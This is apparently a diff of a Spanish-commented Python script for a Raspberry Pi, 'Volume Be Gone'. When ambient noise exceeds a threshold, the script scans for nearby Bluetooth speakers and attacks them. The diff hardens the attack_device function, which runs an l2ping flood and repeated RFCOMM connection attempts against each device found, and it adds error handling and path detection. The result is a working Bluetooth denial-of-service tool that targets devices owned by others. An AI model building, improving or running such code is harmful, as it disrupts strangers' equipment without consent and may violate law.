@@ -1,29 +1,16 @@
-#/usr/bin/env python
+#!/usr/bin/env python
 # -*- coding: utf-8 -*-
 """
 Volume Be Gone - Bluetooth Speaker Control by Volume Level
-ECHO est� desactivado.
 Control automatico de parlantes Bluetooth basado en nivel de volumen ambiental.
 Utiliza un encoder rotativo para configurar el umbral de activacion.
-ECHO est� desactivado.
-Author: [Tu Nombre]
+
+Author: Educational Research Project
 License: MIT
-Version: 2.0
+Version: 2.1 (Corregido)
+
+Basado en Reggaeton Be Gone de Roni Bandini
 """
-
-# El codigo completo debe ser copiado aqui
-# Este es solo un placeholder para la estructura
-
-print("Volume Be Gone v2.0")
-print("Copia el codigo completo de volumeBeGone.py aqui")
-print("Ver documentacion en /docs")
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
-# Volume Be Gone - Control de parlantes BT por nivel de volumen
-# Versión con encoder rotativo para control de umbral
-# Basado en Reggaeton Be Gone de Roni Bandini
-# MIT License
 
 import os
 import subprocess
@@ -43,9 +30,15 @@ import threading
 import bluetooth
 import math
 import json
+from pathlib import Path
 
 # Configuración
-myPath="/home/pi/volumebegone/"
+# Detectar ruta del script automáticamente
+script_dir = Path(__file__).parent.parent.resolve()
+myPath = str(script_dir) + "/"
+config_path = myPath + "config.json"
+log_path = myPath + "log.txt"
+
 threshold_db = 70  # Umbral inicial en decibeles
 min_threshold_db = 70  # Umbral mínimo
 max_threshold_db = 120  # Umbral máximo
@@ -87,13 +80,28 @@ RST = None
 DC = 23
 SPI_PORT = 0
 SPI_DEVICE = 0
-# Cambiado para pantalla 128x64
+
+# Inicializar pantalla
 disp = Adafruit_SSD1306.SSD1306_128_64(rst=RST)
 disp.begin()
 disp.clear()
 disp.display()
-font = ImageFont.truetype('whitrabt.ttf', 12)
-font_small = ImageFont.truetype('whitrabt.ttf', 10)
+
+# Cargar fuente con fallback
+font_path = myPath + 'whitrabt.ttf'
+try:
+    if os.path.exists(font_path):
+        font = ImageFont.truetype(font_path, 12)
+        font_small = ImageFont.truetype(font_path, 10)
+    else:
+        print(f"[!] Advertencia: Fuente {font_path} no encontrada, usando default")
+        font = ImageFont.load_default()
+        font_small = ImageFont.load_default()
+except Exception as e:
+    print(f"[!] Error cargando fuente: {e}, usando default")
+    font = ImageFont.load_default()
+    font_small = ImageFont.load_default()
+
 width = disp.width
 height = disp.height
 image = Image.new('1', (width, height))
@@ -212,11 +220,14 @@ def update_config_screen():
 
 def writeLog(myLine):
     """Escribe en el archivo de log"""
-    now = datetime.datetime.now()
-    dtFormatted = now.strftime("%Y-%m-%d %H:%M:%S")
-    with open('log.txt', 'a') as f:
-        myLine = str(dtFormatted) + "," + myLine
-        f.write(myLine + "\n")
+    try:
+        now = datetime.datetime.now()
+        dtFormatted = now.strftime("%Y-%m-%d %H:%M:%S")
+        with open(log_path, 'a') as f:
+            myLine = str(dtFormatted) + "," + myLine
+            f.write(myLine + "\n")
+    except Exception as e:
+        print(f"[!] Error escribiendo log: {e}")
 
 def updateScreen(message1, message2, message3="", message4=""):
     """Actualiza la pantalla OLED 128x64"""
@@ -325,8 +336,10 @@ def save_config():
         'use_external_adapter': use_external_adapter
     }
     try:
-        with open('/home/pi/volumebegone/config.json', 'w') as f:
-            json.dump(config, f)
+        # Crear directorio si no existe
+        os.makedirs(os.path.dirname(config_path), exist_ok=True)
+        with open(config_path, 'w') as f:
+            json.dump(config, f, indent=2)
         writeLog(f"Configuración guardada: Umbral={threshold_db}dB, Adaptador={'Externo' if use_external_adapter else 'Interno'}")
     except Exception as e:
         print(f"[!] Error guardando configuración: {e}")
@@ -335,14 +348,17 @@ def load_config():
     """Carga la configuración guardada"""
     global threshold_db, calibration_offset, use_external_adapter
     try:
-        with open('/home/pi/volumebegone/config.json', 'r') as f:
-            config = json.load(f)
-            threshold_db = config.get('threshold_db', 70)
-            calibration_offset = config.get('calibration_offset', 94)
-            use_external_adapter = config.get('use_external_adapter', True)
-            print(f"[*] Configuración cargada: Umbral={threshold_db}dB, Adaptador={'Externo' if use_external_adapter else 'Interno'}")
-    except:
-        print("[*] Usando configuración por defecto")
+        if os.path.exists(config_path):
+            with open(config_path, 'r') as f:
+                config = json.load(f)
+                threshold_db = config.get('threshold_db', 70)
+                calibration_offset = config.get('calibration_offset', 94)
+                use_external_adapter = config.get('use_external_adapter', True)
+                print(f"[*] Configuración cargada: Umbral={threshold_db}dB, Adaptador={'Externo' if use_external_adapter else 'Interno'}")
+        else:
+            print("[*] Config.json no encontrado, usando configuración por defecto")
+    except Exception as e:
+        print(f"[!] Error cargando configuración: {e}, usando valores por defecto")
 
 def calculate_db(audio_data):
     """Calcula el nivel de dB del audio"""
@@ -380,9 +396,19 @@ def scan_bluetooth_devices():
             os.system(f"hcitool -i {bt_interface} cmd 0x03 0x001A 0x00 0x10 0x00 0x10")
         
         # Descubrir dispositivos
-        nearby_devices = bluetooth.discover_devices(duration=10, lookup_names=True, 
+        # Determinar device_id basado en el adaptador disponible
+        device_id = -1  # -1 = usar default
+        if bt_interface == "hci1":
+            # Verificar si hci1 existe antes de usarlo
+            result = subprocess.run(['hciconfig'], capture_output=True, text=True)
+            if 'hci1' in result.stdout:
+                device_id = 1
+        else:
+            device_id = 0
+
+        nearby_devices = bluetooth.discover_devices(duration=10, lookup_names=True,
                                                    flush_cache=True, lookup_class=True,
-                                                   device_id=1 if bt_interface == "hci1" else 0)
+                                                   device_id=device_id if device_id >= 0 else None)
         
         bt_devices = []
         for addr, name, device_class in nearby_devices:
@@ -408,37 +434,54 @@ def scan_bluetooth_devices():
 def attack_device(device_addr, device_name, method=2):
     """Ataca un dispositivo específico"""
     global bt_interface
-    
+
     print(f"[*] Atacando {device_addr} ({device_name}) via {bt_interface}")
     writeLog(f"Atacando dispositivo: {device_addr} - {device_name} usando {bt_interface}")
-    
+
     if method == 1:
         # Método 1: Conexión RFCOMM
         for i in range(10):  # Intentos limitados
             try:
                 subprocess.call(['rfcomm', '-i', bt_interface, 'connect', device_addr, '1'], timeout=5)
-            except:
+            except subprocess.TimeoutExpired:
+                pass
+            except FileNotFoundError:
+                print("[!] Comando rfcomm no encontrado")
+                break
+            except Exception as e:
+                print(f"[!] Error en RFCOMM: {e}")
                 pass
             time.sleep(0.1)
-    
+
     elif method == 2:
         # Método 2: L2CAP ping flood
         for i in range(10):
             try:
-                os.system(f'l2ping -i {bt_interface} -s {packagesSize} -f {device_addr} &')
-            except:
+                # Verificar que l2ping existe
+                if os.system('which l2ping > /dev/null 2>&1') == 0:
+                    os.system(f'l2ping -i {bt_interface} -s {packagesSize} -f {device_addr} &')
+                else:
+                    print("[!] Comando l2ping no encontrado")
+                    break
+            except Exception as e:
+                print(f"[!] Error en L2CAP ping: {e}")
                 pass
             time.sleep(0.1)
-    
+
     elif method == 3:
         # Método 3: Conexión múltiple a servicios
         for i in range(10):
             try:
                 # Intentar conectar a diferentes puertos/servicios
                 for port in [1, 3, 5, 17, 19]:  # Puertos comunes de audio BT
-                    subprocess.Popen(['rfcomm', '-i', bt_interface, 'connect', device_addr, str(port)])
+                    subprocess.Popen(['rfcomm', '-i', bt_interface, 'connect', device_addr, str(port)],
+                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                     time.sleep(0.05)
-            except:
+            except FileNotFoundError:
+                print("[!] Comando rfcomm no encontrado")
+                break
+            except Exception as e:
+                print(f"[!] Error en multi-service: {e}")
                 pass
 
 def continuous_attack():
@@ -464,50 +507,66 @@ def continuous_attack():
 def monitor_volume():
     """Monitorea el nivel de volumen continuamente"""
     global monitoring, bt_devices, config_mode
-    
+
     # Variables para el cálculo de dB promedio
     db_history = []
     history_size = 10
-    
+
+    # Verificar que hay dispositivos de audio disponibles
+    try:
+        devices = sd.query_devices()
+        input_device = sd.query_devices(kind='input')
+        print(f"[*] Dispositivo de entrada detectado: {input_device['name']}")
+    except Exception as e:
+        print(f"[!] Error: No se detectó micrófono USB: {e}")
+        updateScreen("ERROR", "Micrófono USB", "no detectado")
+        return
+
     def audio_callback(indata, frames, time, status):
-        if status or config_mode:
+        if status:
+            print(f"[!] Audio callback status: {status}")
+        if config_mode:
             return
-        
+
         # Calcular nivel de dB
         db_level = calculate_db(indata.flatten())
-        
+
         # Mantener historial para promedio
         if db_level > -np.inf:
             db_history.append(db_level)
             if len(db_history) > history_size:
                 db_history.pop(0)
-            
+
             # Calcular promedio
             avg_db = np.mean(db_history)
-            
+
             # Mostrar medidor visual
             draw_volume_meter(avg_db)
-            
+
             # Si supera el umbral, activar ataque
             if avg_db > threshold_db and not scanning:
                 print(f"[!] Umbral superado: {avg_db:.1f} dB")
                 writeLog(f"Umbral superado: {avg_db:.1f} dB")
-                
+
                 # Escanear si no hay dispositivos
                 if not bt_devices:
                     scan_thread = threading.Thread(target=scan_bluetooth_devices)
                     scan_thread.start()
-    
+
     # Iniciar stream de audio
-    with sd.InputStream(callback=audio_callback, 
-                       channels=1,
-                       samplerate=sample_rate,
-                       blocksize=chunk_size):
-        print("[*] Monitoreando nivel de audio...")
-        writeLog(f"Iniciado monitoreo de volumen - Umbral: {threshold_db} dB")
-        
-        while monitoring:
-            time.sleep(0.1)
+    try:
+        with sd.InputStream(callback=audio_callback,
+                           channels=1,
+                           samplerate=sample_rate,
+                           blocksize=chunk_size):
+            print("[*] Monitoreando nivel de audio...")
+            writeLog(f"Iniciado monitoreo de volumen - Umbral: {threshold_db} dB")
+
+            while monitoring:
+                time.sleep(0.1)
+    except Exception as e:
+        print(f"[!] Error en stream de audio: {e}")
+        writeLog(f"Error en audio stream: {str(e)}")
 
 def signal_handler(sig, frame):
     """Maneja la interrupción del programa"""
@@ -548,13 +607,17 @@ def main():
     writeLog(f"Iniciado - Volume Be Gone 2.0 Encoder - Adaptador: {bt_interface}")
     
     # Mostrar logo inicial
+    logo_path = myPath + 'images/logo.png'
     try:
-        image = Image.open(myPath+'images/logo.png').convert('1')
-        disp.image(image)
-        disp.display()
-        time.sleep(2)
-    except:
-        pass
+        if os.path.exists(logo_path):
+            image = Image.open(logo_path).convert('1')
+            disp.image(image)
+            disp.display()
+            time.sleep(2)
+        else:
+            print(f"[*] Logo no encontrado en {logo_path}, omitiendo...")
+    except Exception as e:
+        print(f"[!] Error cargando logo: {e}")
     
     # Modo configuración
     update_config_screen()
